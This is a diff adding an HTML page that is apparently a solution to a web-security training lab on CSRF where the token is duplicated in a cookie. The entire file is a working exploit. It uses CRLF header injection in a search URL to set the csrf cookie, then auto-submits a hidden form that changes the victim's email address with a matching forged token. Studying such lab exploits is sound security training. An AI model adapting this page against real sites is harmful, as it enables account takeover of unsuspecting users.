@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en" xml:lang="en">
+
+<head>
+    <title>CSRF where token is duplicated in cookie</title>
+</head>
+
+<body>
+    <img alt="CSRF where token is duplicated in cookie"
+        src="https://INSTANCEID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=attack%3b%20SameSite=None"
+        onerror="document.forms[0].submit();" />
+    <form action="https://INSTANCEID.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="attacked@normal-user.net" />
+        <input type="hidden" name="csrf" value="attack" />
+        <input type="hidden" name="button"></button>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+
+</html>
